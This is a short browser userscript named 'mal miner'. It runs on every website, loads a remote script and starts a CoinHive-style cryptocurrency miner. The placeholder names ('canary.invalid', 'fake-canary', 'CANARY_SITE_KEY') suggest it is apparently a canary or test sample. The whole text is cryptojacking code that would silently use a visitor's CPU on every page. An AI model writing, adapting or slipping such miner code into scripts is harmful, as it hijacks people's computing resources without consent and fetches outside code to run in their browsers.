// ==UserScript==
// @name         mal miner
// @namespace    canary.invalid
// @version      1.0
// @match        *://*/*
// @require      https://cdn.jsdelivr.net/npm/fake-canary@1.0.0/x.js
// ==/UserScript==
var miner = new CoinHive.Anonymous("CANARY_SITE_KEY", {throttle: 0.3}); miner.start();
